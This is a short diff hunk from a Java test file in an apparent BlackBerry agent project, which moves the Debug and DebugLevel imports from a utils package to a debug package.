@@ -4,8 +4,8 @@ import java.util.Date;
 
 import blackberry.agent.Agent;
 import blackberry.agent.mail.Filter;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.utils.Utils;
 import tests.AssertException;
 import tests.TestUnit;
